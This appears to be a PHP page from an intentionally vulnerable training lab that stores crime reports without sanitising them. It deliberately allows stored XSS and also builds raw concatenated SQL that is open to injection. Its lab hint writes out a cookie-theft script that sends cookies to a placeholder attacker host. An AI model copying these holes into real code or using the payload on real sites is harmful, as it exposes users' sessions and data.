<?php
// ⚠️  INTENTIONALLY VULNERABLE - Stored XSS Lab Demo
session_start();
if (!isset($_SESSION['user'])) {
    header("Location: login.php");
    exit();
}
include 'config.php';

$success = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $title       = $_POST['title'];
    $description = $_POST['description'];
    $location    = $_POST['location'];
    $posted_by   = $_SESSION['user'];

    // ❌ VULNERABLE: No sanitization - stores raw HTML/JS (Stored XSS)
    $query = "INSERT INTO reports (title, description, location, posted_by)
              VALUES ('$title', '$description', '$location', '$posted_by')";
    mysqli_query($conn, $query);
    $success = "Report posted successfully!";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Post Crime Report</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="container">
    <h2>Post a Crime Report</h2>
    <a href="dashboard.php">← Back to Dashboard</a><br><br>

    <?php if ($success): ?>
        <p class="success"><?php echo $success; ?></p>
    <?php endif; ?>

    <form method="POST" action="post_report.php">
        <label>Title:</label>
        <input type="text" name="title" required>

        <label>Description:</label>
        <textarea name="description" rows="4" required></textarea>

        <label>Location:</label>
        <input type="text" name="location">

        <button type="submit">Submit Report</button>
    </form>

    <br>
    <small>
        <strong>Lab Hint (Stored XSS):</strong><br>
        Try in Title field: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
        Cookie theft: <code>&lt;script&gt;document.location='http://ATTACKER_IP/steal.php?c='+document.cookie&lt;/script&gt;</code>
    </small>
</div>
</body>
</html>
